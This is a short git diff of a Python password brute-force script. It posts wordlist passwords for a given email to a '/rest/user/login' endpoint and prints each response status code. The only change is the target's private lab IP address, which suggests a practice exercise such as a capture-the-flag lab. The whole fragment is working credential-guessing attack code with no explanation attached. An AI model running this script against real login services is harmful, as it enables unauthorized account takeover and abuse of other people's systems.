@@ -14,7 +14,7 @@ with open("wordlist.txt", "r") as file:
 for password in passwords:
     password = password.strip()
     data ={"email" : user, "password": password}
-    response = requests.post("http://10.10.110.200/rest/user/login", json=data)
+    response = requests.post("http://10.10.181.191/rest/user/login", json=data)
     code = response.status_code
     print(f'E-MAIL(login):{Fore.YELLOW}{user}{Style.RESET_ALL} - {Fore.BLUE}{password}{Style.RESET_ALL} - Status Code : {Fore.RED}{code}{Style.RESET_ALL}'.format(user, password, code))
     # print(f"This is {Fore.GREEN}{user}{Style.RESET_ALL}!".format(user))
